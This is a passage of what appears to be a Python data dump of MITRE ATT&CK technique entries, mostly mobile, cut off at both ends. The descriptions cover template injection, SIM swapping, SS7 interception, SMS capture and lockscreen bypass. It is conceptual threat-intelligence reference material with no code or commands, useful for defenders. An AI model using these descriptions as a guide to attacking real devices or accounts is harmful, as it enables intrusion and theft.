                          'Adversaries may abuse this technology to initially conceal malicious code to be executed '
                          'via documents (i.e. [Scripting](https://attack.mitre.org/techniques/T1064)). Template '
                          'references injected into a document may enable malicious payloads to be fetched and '
                          'executed when the document is loaded. (Citation: SANS Brian Wiltse Template Injection) '
                          'These documents can be delivered via other techniques such as [Spearphishing '
                          'Attachment](https://attack.mitre.org/techniques/T1193) and/or [Taint Shared '
                          'Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since '
                          'no typical indicators (VBA macro, script, etc.) are present until after the malicious '
                          'payload is fetched. (Citation: Redxorblue Remote Template Injection) Examples have been '
                          'seen in the wild where template injection was used to load malicious code containing an '
                          'exploit. (Citation: MalwareBytes Template Injection OCT 2017)\n'
                          '\n'
                          'This technique may also enable [Forced '
                          'Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or '
                          'other credential prompting) URL and triggering an authentication attempt. (Citation: '
                          'Anomali Template Injection MAR 2018) (Citation: Talos Template Injection July 2017) '
                          '(Citation: ryhanson phishery SEPT 2016)',
           'name': 'Template Injection',
           'platforms': ['Windows']},
 'T1222': {'attack_id': 'T1222',
           'categories': ['defense-evasion'],
           'description': 'File permissions are commonly managed by discretionary access control lists (DACLs) '
                          'specified by the file owner. File DACL implementation may vary by platform, but generally '
                          'explicitly designate which users/groups can perform which actions (ex: read, write, '
                          'execute, etc.). (Citation: Microsoft DACL May 2018) (Citation: Microsoft File Rights May '
                          '2018) (Citation: Unix File Permissions)\n'
                          '\n'
                          'Adversaries may modify file permissions/attributes to evade intended DACLs. (Citation: '
                          'Hybrid Analysis Icacls1 June 2018) (Citation: Hybrid Analysis Icacls2 May 2018) '
                          'Modifications may include changing specific access rights, which may require taking '
                          'ownership of a file and/or elevated permissions such as Administrator/root depending on the '
                          "file's existing permissions to enable malicious activity such as modifying, replacing, or "
                          'deleting specific files. Specific file modifications may be a required step for many '
                          'techniques, such as establishing Persistence via [Accessibility '
                          'Features](https://attack.mitre.org/techniques/T1015), [Logon '
                          'Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other '
                          'instrumental binary/configuration files.',
           'name': 'File Permissions Modification',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1223': {'attack_id': 'T1223',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help '
                          'system. CHM files are compressed compilations of various content such as HTML documents, '
                          'images, and scripting/web related programming languages such VBA, JScript, Java, and '
                          'ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying '
                          'components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded '
                          'by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable '
                          'Program)\n'
                          '\n'
                          'Adversaries may abuse this technology to conceal malicious code. A custom CHM file '
                          'containing embedded payloads could be delivered to a victim then triggered by [User '
                          'Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass '
                          'application whitelisting on older and/or unpatched systems that do not account for '
                          'execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: '
                          'Microsoft CVE-2017-8625 Aug 2017)',
           'name': 'Compiled HTML File',
           'platforms': ['Windows']},
 'T1398': {'attack_id': 'T1398',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'If an adversary can escalate privileges, he or she may be able to use those privileges to '
                          'place malicious code in the device kernel or other boot partition components, where the '
                          'code may evade detection, may persist after device resets, and may not be removable by the '
                          'device user. In some cases (e.g., the Samsung Knox warranty bit as described under '
                          'Detection), the attack may be detected but could result in the device being placed in a '
                          'state that no longer allows certain functionality.\n'
                          '\n'
                          'Many Android devices provide the ability to unlock the bootloader for development purposes, '
                          'but doing so introduces the potential ability for others to maliciously update the kernel '
                          'or other boot partition code.\n'
                          '\n'
                          'If the bootloader is not unlocked, it may still be possible to exploit device '
                          'vulnerabilities to update the code.',
           'name': 'Modify OS Kernel or Boot Partition',
           'platforms': ['Android', 'iOS']},
 'T1399': {'attack_id': 'T1399',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'If an adversary can escalate privileges, he or she may be able to use those privileges to '
                          "place malicious code in the device's Trusted Execution Environment (TEE) or other similar "
                          'isolated execution environment where the code can evade detection, may persist after device '
                          'resets, and may not be removable by the device user. Running code within the TEE may '
                          'provide an adversary with the ability to monitor or tamper with overall device '
                          'behavior.(Citation: Roth-Rootkits)',
           'name': 'Modify Trusted Execution Environment',
           'platforms': ['Android']},
 'T1400': {'attack_id': 'T1400',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'If an adversary can escalate privileges, he or she may be able to use those privileges to '
                          'place malicious code in the device system partition, where it may persist after device '
                          'resets and may not be easily removed by the device user.\n'
                          '\n'
                          'Many Android devices provide the ability to unlock the bootloader for development purposes. '
                          'An unlocked bootloader may provide the ability for an adversary to modify the system '
                          'partition. Even if the bootloader is locked, it may be possible for an adversary to '
                          'escalate privileges and then modify the system partition.',
           'name': 'Modify System Partition',
           'platforms': ['Android', 'iOS']},
 'T1401': {'attack_id': 'T1401',
           'categories': ['persistence'],
           'description': 'A malicious application can request Device Administrator privileges. If the user grants the '
                          'privileges, the application can take steps to make its removal more difficult.',
           'name': 'Abuse Device Administrator Access to Prevent Removal',
           'platforms': ['Android']},
 'T1402': {'attack_id': 'T1402',
           'categories': ['persistence'],
           'description': "An Android application can listen for the BOOT_COMPLETED broadcast, ensuring that the app's "
                          'functionality will be activated every time the device starts up without having to wait for '
                          'the device user to manually start the app.\n'
                          '\n'
                          'An analysis published in 2012(Citation: Zhou) of1260 Android malware samples belonging to '
                          '49 families of malware determined that 29 malware families and 83.3% of the samples '
                          'listened for BOOT_COMPLETED.',
           'name': 'App Auto-Start at Device Boot',
           'platforms': ['Android']},
 'T1403': {'attack_id': 'T1403',
           'categories': ['persistence'],
           'description': 'ART (the Android Runtime) compiles optimized code on the device itself to improve '
                          'performance. If an adversary can escalate privileges, he or she may be able to use those '
                          'privileges to modify the cached code in order to hide malicious behavior. Since the code is '
                          'compiled on the device, it may not receive the same level of integrity checks that are '
                          'provided to code running in the system partition.\n'
                          '\n'
                          'Sabanal describes the potential use of this technique in  (Citation: Sabanal-ART).',
           'name': 'Modify cached executable code',
           'platforms': ['Android']},
 'T1404': {'attack_id': 'T1404',
           'categories': ['privilege-escalation'],
           'description': 'A malicious app can exploit unpatched vulnerabilities in the operating system to obtain '
                          'escalated privileges.',
           'name': 'Exploit OS Vulnerability',
           'platforms': ['Android', 'iOS']},
 'T1405': {'attack_id': 'T1405',
           'categories': ['credential-access', 'privilege-escalation'],
           'description': 'A malicious app or other attack vector could be used to exploit vulnerabilities in code '
                          'running within the Trusted Execution Environment (TEE) (Citation: Thomas-TrustZone). The '
                          'adversary could then obtain privileges held by the TEE potentially including the ability to '
                          'access cryptographic keys or other sensitive data (Citation: QualcommKeyMaster). Escalated '
                          'operating system privileges may be first required in order to have the ability to attack '
                          'the TEE (Citation: EkbergTEE). If not, privileges within the TEE can potentially be used to '
                          'exploit the operating system (Citation: laginimaineb-TEE).',
           'name': 'Exploit TEE Vulnerability',
           'platforms': ['Android']},
 'T1406': {'attack_id': 'T1406',
           'categories': ['defense-evasion'],
           'description': 'An app could contain malicious code in obfuscated or encrypted form, then deobfuscate or '
                          'decrypt the code at runtime to evade many app vetting techniques.(Citation: Rastogi) '
                          '(Citation: Zhou) (Citation: TrendMicro-Obad) (Citation: Xiao-iOS)',
           'name': 'Obfuscated Files or Information',
           'platforms': ['Android', 'iOS']},
 'T1407': {'attack_id': 'T1407',
           'categories': ['defense-evasion'],
           'description': 'An app could download and execute dynamic code (not included in the original application '
                          'package) after installation to evade static analysis techniques (and potentially dynamic '
                          'analysis techniques) used for application vetting or application store review.(Citation: '
                          'Poeplau-ExecuteThis)\n'
                          '\n'
                          'On Android, dynamic code could include native code, Dalvik code, or JavaScript code that '
                          "uses the Android WebView's JavascriptInterface capability.(Citation: Bromium-AndroidRCE)\n"
                          '\n'
                          'On iOS, techniques also exist for executing dynamic code downloaded after application '
                          'installation.(Citation: FireEye-JSPatch)(Citation: Wang)',
           'name': 'Download New Code at Runtime',
           'platforms': ['Android', 'iOS']},
 'T1408': {'attack_id': 'T1408',
           'categories': ['defense-evasion'],
           'description': 'An adversary could use knowledge of the techniques used by security software to evade '
                          'detection(Citation: Brodie)(Citation: Tan). For example, some mobile security products '
                          'perform compromised device detection by searching for particular artifacts such as an '
                          'installed "su" binary, but that check could be evaded by naming the binary something else. '
                          'Similarly, polymorphic code techniques could be used to evade signature-based '
                          'detection(Citation: Rastogi).',
           'name': 'Disguise Root/Jailbreak Indicators',
           'platforms': ['Android', 'iOS']},
 'T1409': {'attack_id': 'T1409',
           'categories': ['collection', 'credential-access'],
           'description': 'An adversary could attempt to read files that contain sensitive data or credentials (e.g., '
                          'private keys, passwords, access tokens). This technique requires either escalated '
                          'privileges or for the targeted app to have stored the data in an insecure manner (e.g., '
                          'with insecure file permissions or in an insecure location such as an external storage '
                          'directory).',
           'name': 'Access Sensitive Data or Credentials in Files',
           'platforms': ['Android', 'iOS']},
 'T1410': {'attack_id': 'T1410',
           'categories': ['collection', 'credential-access'],
           'description': 'An adversary may capture network traffic to and from the device to obtain credentials or '
                          'other sensitive data, or redirect network traffic to flow through an adversary-controlled '
                          'gateway to do the same.\n'
                          '\n'
                          'A malicious app could register itself as a VPN client on Android or iOS to gain access to '
                          'network packets. However, on both platforms, the user must grant consent to the app to act '
                          'as a VPN client, and on iOS the app requires a special entitlement that must be granted by '
                          'Apple.\n'
                          '\n'
                          'Alternatively, if a malicious app is able to escalate operating system privileges, it may '
                          'be able to use those privileges to gain access to network traffic.\n'
                          '\n'
                          'An adversary could redirect network traffic to an adversary-controlled gateway by '
                          "establishing a VPN connection or by manipulating the device's proxy settings. For example, "
                          'Skycure (Citation: Skycure-Profiles) describes the ability to redirect network traffic by '
                          'installing a malicious iOS Configuration Profile.\n'
                          '\n'
                          'If applications encrypt their network traffic, sensitive data may not be accessible to an '
                          'adversary, depending on the point of capture.',
           'name': 'Network Traffic Capture or Redirection',
           'platforms': ['Android', 'iOS']},
 'T1411': {'attack_id': 'T1411',
           'categories': ['credential-access'],
           'description': 'User Interface Spoofing can be used to trick users into providing sensitive information, '
                          'such as account credentials, bank account information, or Personally Identifiable '
                          'Information (PII) to an unintended entity.\n'
                          '\n'
                          '### Impersonate User Interface of Legitimate App or Device Function\n'
                          '\n'
                          'On both Android and iOS, an adversary could impersonate the user interface of a legitimate '
                          'app or device function to trick a user into entering sensitive information. The constrained '
                          'display size of mobile devices (compared to traditional PC displays) may impair the ability '
                          'to provide the user with contextual information (for example, displaying a full web site '
                          'address) that may alert the user to a potential issue. (Citation: '
                          'Felt-PhishingOnMobileDevices) As described by PRE-ATT&CK ([Spearphishing for '
                          'Information](https://attack.mitre.org/techniques/T1397)), it is also possible for an '
                          'adversary to carry out this form of the technique without a direct adversary presence on '
                          'the mobile devices, e.g. through a spoofed web page.\n'
                          '\n'
                          '### Impersonate Identity of Legitimate App\n'
                          '\n'
                          'On both Android and iOS, a malicious app could impersonate the identity of another app '
                          '(e.g. use the same app name and/or icon) and somehow get installed on the device (e.g. '
                          'using [Deliver Malicious App via Authorized App '
                          'Store](https://attack.mitre.org/techniques/T1475) or [Deliver Malicious App via Other '
                          'Means](https://attack.mitre.org/techniques/T1476)). The malicious app could then prompt the '
                          'user for sensitive information. (Citation: eset-finance)\n'
                          '\n'
                          '### Abuse OS Features to Interfere with Legitimate App\n'
                          '\n'
                          'On older versions of Android, a malicious app could abuse mobile operating system features '
                          'to interfere with a running legitimate app. (Citation: Felt-PhishingOnMobileDevices) '
                          '(Citation: Hassell-ExploitingAndroid) However, this technique appears to have been '
                          "addressed starting in Android 5.0 with the deprecation of the Android's "
                          'ActivityManager.getRunningTasks method and modification of its behavior (Citation: '
                          'Android-getRunningTasks) and further addressed in Android 5.1.1 (Citation: '
                          'StackOverflow-getRunningAppProcesses) to prevent a malicious app from determining what app '
                          'is currently in the foreground.',
           'name': 'User Interface Spoofing',
           'platforms': ['Android', 'iOS']},
 'T1412': {'attack_id': 'T1412',
           'categories': ['collection', 'credential-access'],
           'description': 'A malicious application could capture sensitive data sent via SMS, including authentication '
                          'credentials. SMS is frequently used to transmit codes used for multi-factor '
                          'authentication.\n'
                          '\n'
                          'On Android, a malicious application must request and obtain permission (either at app '
                          'install time or run time) in order to receive SMS messages. Alternatively, a malicious '
                          'application could attempt to perform an operating system privilege escalation attack to '
                          'bypass the permission requirement.\n'
                          '\n'
                          'On iOS, applications cannot access SMS messages in normal operation, so an adversary would '
                          'need to attempt to perform an operating system privilege escalation attack to potentially '
                          'be able to access SMS messages.',
           'name': 'Capture SMS Messages',
           'platforms': ['Android', 'iOS']},
 'T1413': {'attack_id': 'T1413',
           'categories': ['collection', 'credential-access'],
           'description': 'On versions of Android prior to 4.1, an adversary may use a malicious application that '
                          'holds the READ_LOGS permission to obtain private keys, passwords, other credentials, or '
                          "other sensitive data stored in the device's system log. On Android 4.1 and later, an "
                          'adversary would need to attempt to perform an operating system privilege escalation attack '
                          'to be able to access the log.',
           'name': 'Access Sensitive Data in Device Logs',
           'platforms': ['Android']},
 'T1414': {'attack_id': 'T1414',
           'categories': ['collection', 'credential-access'],
           'description': 'A malicious app or other attack vector could capture sensitive data stored in the device '
                          'clipboard, for example passwords being copy-and-pasted from a password manager app.',
           'name': 'Capture Clipboard Data',
           'platforms': ['Android', 'iOS']},
 'T1415': {'attack_id': 'T1415',
           'categories': ['credential-access'],
           'description': 'An iOS application may be able to maliciously claim a URL scheme, allowing it to intercept '
                          'calls that are meant for a different application(Citation: FireEye-Masque2)(Citation: '
                          'Dhanjani-URLScheme). This technique, for example, could be used to capture OAuth '
                          'authorization codes(Citation: IETF-PKCE) or to phish user credentials(Citation: '
                          'MobileIron-XARA).',
           'name': 'URL Scheme Hijacking',
           'platforms': ['iOS']},
 'T1416': {'attack_id': 'T1416',
           'categories': ['credential-access'],
           'description': 'A malicious app can register to receive intents meant for other applications and may then '
                          'be able to receive sensitive values such as OAuth authorization codes(Citation: IETF-PKCE).',
           'name': 'Android Intent Hijacking',
           'platforms': ['Android']},
 'T1417': {'attack_id': 'T1417',
           'categories': ['collection', 'credential-access'],
           'description': 'A malicious app can register as a device keyboard and intercept keypresses containing '
                          'sensitive values such as usernames and passwords(Citation: Zeltser-Keyboard).\n'
                          '\n'
                          'Both iOS and Android require the user to explicitly authorize use of third party keyboard '
                          'apps. Users should be advised to use extreme caution before granting this authorization '
                          'when it is requested.',
           'name': 'Malicious Third Party Keyboard App',
           'platforms': ['Android', 'iOS']},
 'T1418': {'attack_id': 'T1418',
           'categories': ['defense-evasion', 'discovery'],
           'description': 'Adversaries may seek to identify all applications installed on the device. One use case for '
                          'doing so is to identify the presence of endpoint security applications that may increase '
                          "the adversary's risk of detection. Another use case is to identify the presence of "
                          'applications that the adversary may wish to target.\n'
                          '\n'
                          'On Android, applications can use methods in the PackageManager class (Citation: '
                          'Android-PackageManager) to enumerate other apps installed on device, or an entity with '
                          'shell access can use the pm command line tool.\n'
                          '\n'
                          'On iOS, apps can use private API calls to obtain a list of other apps installed on the '
                          'device. (Citation: Kurtz-MaliciousiOSApps) However, use of private API calls will likely '
                          "prevent the application from being distributed through Apple's App Store.",
           'name': 'Application Discovery',
           'platforms': ['Android', 'iOS']},
 'T1419': {'attack_id': 'T1419',
           'categories': ['discovery'],
           'description': 'On Android, device type information is accessible to apps through the android.os.Build '
                          'class (Citation: Android-Build). Device information could be used to target privilege '
                          'escalation exploits.',
           'name': 'Device Type Discovery',
           'platforms': ['Android']},
 'T1420': {'attack_id': 'T1420',
           'categories': ['discovery'],
           'description': 'On Android, command line tools or the Java file APIs can be used to enumerate file system '
                          'contents. However, Linux file permissions and SELinux policies generally strongly restrict '
                          'what can be accessed by apps (without taking advantage of a privilege escalation exploit). '
                          'The contents of the external storage directory are generally visible, which could present '
                          'concern if sensitive data is inappropriately stored there.\n'
                          '\n'
                          "iOS's security architecture generally restricts the ability to perform file and directory "
                          'discovery without use of escalated privileges.',
           'name': 'File and Directory Discovery',
           'platforms': ['Android']},
 'T1421': {'attack_id': 'T1421',
           'categories': ['discovery'],
           'description': 'On Android, applications can use standard APIs to gather a list of network connections to '
                          'and from the device. For example, the Network Connections app available in the Google Play '
                          'Store (Citation: ConnMonitor) advertises this functionality.',
           'name': 'System Network Connections Discovery',
           'platforms': ['Android']},
 'T1422': {'attack_id': 'T1422',
           'categories': ['discovery'],
           'description': 'On Android, details of onboard network interfaces are accessible to apps through the '
                          'java.net.NetworkInterface class (Citation: NetworkInterface). The Android TelephonyManager '
                          'class can be used to gather related information such as the IMSI, IMEI, and phone number '
                          '(Citation: TelephonyManager).',
           'name': 'System Network Configuration Discovery',
           'platforms': ['Android']},
 'T1423': {'attack_id': 'T1423',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to get a listing of services running on remote hosts, including '
                          'those that may be vulnerable to remote software exploitation. Methods to acquire this '
                          'information include port scans and vulnerability scans from the mobile device. This '
                          "technique may take advantage of the mobile device's access to an internal enterprise "
                          'network either through local connectivity or through a Virtual Private Network (VPN).',
           'name': 'Network Service Scanning',
           'platforms': ['Android', 'iOS']},
 'T1424': {'attack_id': 'T1424',
           'categories': ['discovery'],
           'description': 'On Android versions prior to 5, applications can observe information about other processes '
                          'that are running through methods in the ActivityManager class. On Android versions prior to '
                          '7, applications can obtain this information by executing the <code>ps</code> command, or by '
                          'examining the <code>/proc</code> directory. Starting in Android version 7, use of the Linux '
                          "kernel's <code>hidepid</code> feature prevents applications (without escalated privileges) "
                          'from accessing this information (Citation: Android-SELinuxChanges).',
           'name': 'Process Discovery',
           'platforms': ['Android']},
 'T1426': {'attack_id': 'T1426',
           'categories': ['discovery'],
           'description': 'An adversary may attempt to get detailed information about the operating system and '
                          'hardware, including version, patches, and architecture.\n'
                          '\n'
                          'On Android, much of this information is programmatically accessible to applications through '
                          'the android.os.Build class(Citation: Android-Build).\n'
                          '\n'
                          'On iOS, techniques exist for applications to programmatically access this '
                          'information(Citation: StackOverflow-iOSVersion).',
           'name': 'System Information Discovery',
           'platforms': ['Android', 'iOS']},
 'T1427': {'attack_id': 'T1427',
           'categories': ['lateral-movement'],
           'description': 'With escalated privileges, an adversary could program the mobile device to impersonate USB '
                          'devices such as input devices (keyboard and mouse), storage devices, and/or networking '
                          'devices in order to attack a physically connected PC(Citation: '
                          'Wang-ExploitingUSB)(Citation: ArsTechnica-PoisonTap) This technique has been demonstrated '
                          'on Android. We are unaware of any demonstrations on iOS.',
           'name': 'Attack PC via USB Connection',
           'platforms': ['Android']},
 'T1428': {'attack_id': 'T1428',
           'categories': ['lateral-movement'],
           'description': 'Adversaries may attempt to exploit enterprise servers, workstations, or other resources '
                          "over the network. This technique may take advantage of the mobile device's access to an "
                          'internal enterprise network either through local connectivity or through a Virtual Private '
                          'Network (VPN).',
           'name': 'Exploit Enterprise Resources',
           'platforms': ['Android', 'iOS']},
 'T1429': {'attack_id': 'T1429',
           'categories': ['collection'],
           'description': 'An adversary could use a malicious or exploited application to surreptitiously record '
                          'activities using the device microphone and/or camera through use of standard operating '
                          'system APIs.',
           'name': 'Microphone or Camera Recordings',
           'platforms': ['Android', 'iOS']},
 'T1430': {'attack_id': 'T1430',
           'categories': ['collection'],
           'description': 'An adversary could use a malicious or exploited application to surreptitiously track the '
                          "device's physical location through use of standard operating system APIs.",
           'name': 'Location Tracking',
           'platforms': ['Android', 'iOS']},
 'T1432': {'attack_id': 'T1432',
           'categories': ['collection'],
           'description': 'An adversary could call standard operating system APIs from a malicious application to '
                          'gather contact list (i.e., address book) data, or with escalated privileges could directly '
                          'access files containing contact list data.',
           'name': 'Access Contact List',
           'platforms': ['Android', 'iOS']},
 'T1433': {'attack_id': 'T1433',
           'categories': ['collection'],
           'description': 'On Android, an adversary could call standard operating system APIs from a malicious '
                          'application to gather call log data, or with escalated privileges could directly access '
                          'files containing call log data.\n'
                          '\n'
                          'On iOS, applications do not have access to the call log, so privilege escalation would be '
                          'required in order to access the data.',
           'name': 'Access Call Log',
           'platforms': ['Android', 'iOS']},
 'T1435': {'attack_id': 'T1435',
           'categories': ['collection'],
           'description': 'An adversary could call standard operating system APIs from a malicious application to '
                          'gather calendar entry data, or with escalated privileges could directly access files '
                          'containing calendar data.',
           'name': 'Access Calendar Entries',
           'platforms': ['Android', 'iOS']},
 'T1436': {'attack_id': 'T1436',
           'categories': ['command-and-control', 'exfiltration'],
           'description': 'Adversaries may communicate over a commonly used port to bypass firewalls or network '
                          'detection systems and to blend with normal network activity to avoid more detailed '
                          'inspection. They may use commonly open ports such as\n'
                          '\n'
                          '* TCP:80 (HTTP)\n'
                          '* TCP:443 (HTTPS)\n'
                          '* TCP:25 (SMTP)\n'
                          '* TCP/UDP:53 (DNS)\n'
                          '\n'
                          'They may use the protocol associated with the port or a completely different protocol.',
           'name': 'Commonly Used Port',
           'platforms': ['Android', 'iOS']},
 'T1437': {'attack_id': 'T1437',
           'categories': ['command-and-control', 'exfiltration'],
           'description': 'Adversaries may communicate using a common, standardized application layer protocol such as '
                          'HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic.\n'
                          '\n'
                          'In the mobile environment, the Google Cloud Messaging (GCM; two-way) and Apple Push '
                          'Notification Service (APNS; one-way server-to-device) are commonly used protocols on '
                          'Android and iOS respectively that would blend in with routine device traffic and are '
                          'difficult for enterprises to inspect. Google reportedly responds to reports of abuse by '
                          'blocking access to GCM.(Citation: Kaspersky-MobileMalware)',
           'name': 'Standard Application Layer Protocol',
           'platforms': ['Android', 'iOS']},
 'T1438': {'attack_id': 'T1438',
           'categories': ['command-and-control', 'exfiltration'],
           'description': 'Adversaries can communicate using cellular networks rather than enterprise Wi-Fi in order '
                          'to bypass enterprise network monitoring systems. Adversaries may also communicate using '
                          'other non-Internet Protocol mediums such as SMS, NFC, or Bluetooth to bypass network '
                          'monitoring systems.',
           'name': 'Alternate Network Mediums',
           'platforms': ['Android', 'iOS']},
 'T1439': {'attack_id': 'T1439',
           'categories': ['network-effects'],
           'description': 'If network traffic between the mobile device and remote servers is unencrypted or is '
                          'encrypted in an insecure manner, then an adversary positioned on the network can eavesdrop '
                          'on communication.(Citation: mHealth)',
           'name': 'Eavesdrop on Insecure Network Communication',
           'platforms': ['Android', 'iOS']},
 'T1444': {'attack_id': 'T1444',
           'categories': ['initial-access'],
           'description': 'An adversary could download a legitimate app, disassemble it, add malicious code, and then '
                          'reassemble the app(Citation: Zhou). The app would appear to be the original app but contain '
                          'additional malicious functionality. The adversary could then publish this app to app stores '
                          'or use another delivery technique.',
           'name': 'Repackaged Application',
           'platforms': ['Android', 'iOS']},
 'T1446': {'attack_id': 'T1446',
           'categories': ['effects'],
           'description': 'An adversary may seek to lock the legitimate user out of the device, for example until a '
                          'ransom is paid.\n'
                          '\n'
                          'On Android versions prior to 7, apps can abuse Device Administrator access to reset the '
                          'device lock passcode to lock the user out of the device.\n'
                          '\n'
                          'On iOS devices, this technique does not work because mobile device management servers can '
                          'only remove the screen lock passcode, they cannot set a new passcode. However, on '
                          'jailbroken devices, malware has been demonstrated that can lock the user out of the device '
                          '(Citation: Xiao-KeyRaider).',
           'name': 'Lock User Out of Device',
           'platforms': ['Android', 'iOS']},
 'T1447': {'attack_id': 'T1447',
           'categories': ['effects'],
           'description': 'A malicious application could abuse Android device administrator access to wipe device '
                          'contents, for example if a ransom is not paid.',
           'name': 'Wipe Device Data',
           'platforms': ['Android']},
 'T1448': {'attack_id': 'T1448',
           'categories': ['effects'],
           'description': 'A malicious app could use standard Android APIs to send SMS messages. SMS messages could '
                          'potentially be sent to premium numbers that charge the device owner and generate revenue '
                          'for an adversary(Citation: Lookout-SMS).\n'
                          '\n'
                          'On iOS, apps cannot send SMS messages.\n'
                          '\n'
                          'On Android, apps must hold the SEND_SMS permission to send SMS messages. Additionally, '
                          'Android version 4.2 and above has mitigations against this threat by requiring user consent '
                          'before allowing SMS messages to be sent to premium numbers (Citation: AndroidSecurity2014).',
           'name': 'Premium SMS Toll Fraud',
           'platforms': ['Android']},
 'T1449': {'attack_id': 'T1449',
           'categories': ['network-effects'],
           'description': 'An adversary could exploit signaling system vulnerabilities to redirect calls or text '
                          "messages (SMS) to a phone number under the attacker's control. The adversary could then act "
                          'as a man-in-the-middle to intercept or manipulate the communication. (Citation: Engel-SS7) '
                          '(Citation: Engel-SS7-2008) (Citation: 3GPP-Security) (Citation: Positive-SS7) (Citation: '
                          'CSRIC5-WG10-FinalReport) Interception of SMS messages could enable adversaries to obtain '
                          'authentication codes used for multi-factor authentication(Citation: TheRegister-SS7).',
           'name': 'Exploit SS7 to Redirect Phone Calls/SMS',
           'platforms': ['Android', 'iOS']},
 'T1450': {'attack_id': 'T1450',
           'categories': ['network-effects'],
           'description': 'An adversary could exploit signaling system vulnerabilities to track the location of mobile '
                          'devices. (Citation: Engel-SS7) (Citation: Engel-SS7-2008) (Citation: 3GPP-Security) '
                          '(Citation: Positive-SS7) (Citation: CSRIC5-WG10-FinalReport)',
           'name': 'Exploit SS7 to Track Device Location',
           'platforms': ['Android', 'iOS']},
 'T1451': {'attack_id': 'T1451',
           'categories': ['network-effects'],
           'description': 'An adversary could convince the mobile network operator (e.g. through social networking, '
                          'forged identification, or insider attacks performed by trusted employees) to issue a new '
                          'SIM card and associate it with an existing phone number and account (Citation: '
                          'NYGov-Simswap) (Citation: Motherboard-Simswap2). The adversary could then obtain SMS '
                          'messages or hijack phone calls intended for someone else (Citation: Betanews-Simswap). \n'
                          '\n'
                          'One use case is intercepting authentication messages or phone calls to obtain illicit '
                          'access to online banking or other online accounts, as many online services allow account '
                          'password resets by sending an authentication code over SMS to a phone number associated '
                          'with the account (Citation: Guardian-Simswap) (Citation: Motherboard-Simswap1)(Citation: '
                          'Krebs-SimSwap)(Citation: TechCrunch-SimSwap).',
           'name': 'SIM Card Swap',
           'platforms': ['Android', 'iOS']},
 'T1452': {'attack_id': 'T1452',
           'categories': ['effects'],
           'description': "An adversary could use access to a compromised device's credentials to attempt to "
                          'manipulate app store rankings or ratings by triggering application downloads or posting '
                          'fake reviews of applications. This technique likely requires privileged access (a rooted or '
                          'jailbroken device).',
           'name': 'Manipulate App Store Rankings or Ratings',
           'platforms': ['Android', 'iOS']},
 'T1453': {'attack_id': 'T1453',
           'categories': ['collection', 'credential-access'],
           'description': "A malicious app could abuse Android's accessibility features to capture sensitive data or "
                          'perform other malicious actions(Citation: Skycure-Accessibility).',
           'name': 'Abuse Accessibility Features',
           'platforms': ['Android']},
 'T1456': {'attack_id': 'T1456',
           'categories': ['initial-access'],
           'description': 'As described by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), a '
                          'drive-by compromise is when an adversary gains access to a system through a user visiting a '
                          "website over the normal course of browsing. With this technique, the user's web browser is "
                          'targeted for exploitation. For example, a website may contain malicious media content '
                          'intended to exploit vulnerabilities in media parsers as demonstrated by the Android '
                          'Stagefright vulnerability  (Citation: Zimperium-Stagefright).\n'
                          '\n'
                          '(This technique was formerly known as Malicious Web Content. It has been renamed to better '
                          'align with ATT&CK for Enterprise.)',
           'name': 'Drive-by Compromise',
           'platforms': ['Android', 'iOS']},
 'T1458': {'attack_id': 'T1458',
           'categories': ['initial-access'],
           'description': 'If the mobile device is connected (typically via USB) to a charging station or a PC, for '
                          "example to charge the device's battery, then a compromised or malicious charging station or "
                          'PC could attempt to exploit the mobile device via the connection(Citation: '
                          'Krebs-JuiceJacking).\n'
                          '\n'
                          'Previous demonstrations have included:\n'
                          '\n'
                          '* Injecting malicious applications into iOS devices(Citation: Lau-Mactans).\n'
                          '* Exploiting a Nexus 6 or 6P device over USB and gaining the ability to perform actions '
                          'including intercepting phone calls, intercepting network traffic, and obtaining the device '
                          'physical location(Citation: IBM-NexusUSB).\n'
                          '* Exploiting Android devices such as the Google Pixel 2 over USB(Citation: '
                          'GoogleProjectZero-OATmeal).\n'
                          '\n'
                          'Products from Cellebrite and Grayshift purportedly can use physical access to the data port '
                          'to unlock the passcode on some iOS devices(Citation: Computerworld-iPhoneCracking).',
           'name': 'Exploit via Charging Station or PC',
           'platforms': ['Android', 'iOS']},
 'T1461': {'attack_id': 'T1461',
           'categories': ['initial-access'],
           'description': "An adversary with physical access to a mobile device may seek to bypass the device's "
                          'lockscreen.\n'
                          '\n'
                          '### Biometric Spoofing\n'
                          "If biometric authentication is used, an adversary could attempt to spoof a mobile device's "
                          'biometric authentication mechanism(Citation: SRLabs-Fingerprint)(Citation: '
                          'SecureIDNews-Spoof)(Citation: TheSun-FaceID).\n'
                          '\n'
                          'iOS partly mitigates this attack by requiring the device passcode rather than a fingerprint '
                          'to unlock the device after every device restart and after 48 hours since the device was '
                          'last unlocked (Citation: Apple-TouchID). Android has similar mitigations.\n'
                          '\n'
                          '### Device Unlock Code Guessing or Brute Force\n'
                          'An adversary could attempt to brute-force or otherwise guess the lockscreen passcode '
                          '(typically a PIN or password), including physically observing ("shoulder surfing") the '
                          "device owner's use of the lockscreen passcode. \n"
                          '\n'
                          '### Exploit Other Device Lockscreen Vulnerabilities\n'
                          'Techniques have periodically been demonstrated that exploit vulnerabilities on Android '
                          '(Citation: Wired-AndroidBypass), iOS (Citation: Kaspersky-iOSBypass), or other mobile '
                          'devices to bypass the device lockscreen. The vulnerabilities are generally patched by the '
                          'device/operating system vendor once they become aware of their existence.',
           'name': 'Lockscreen Bypass',
           'platforms': ['Android', 'iOS']},
 'T1463': {'attack_id': 'T1463',
           'categories': ['network-effects'],
           'description': 'If network traffic between the mobile device and a remote server is not securely protected, '
                          'then an attacker positioned on the network may be able to manipulate network communication '
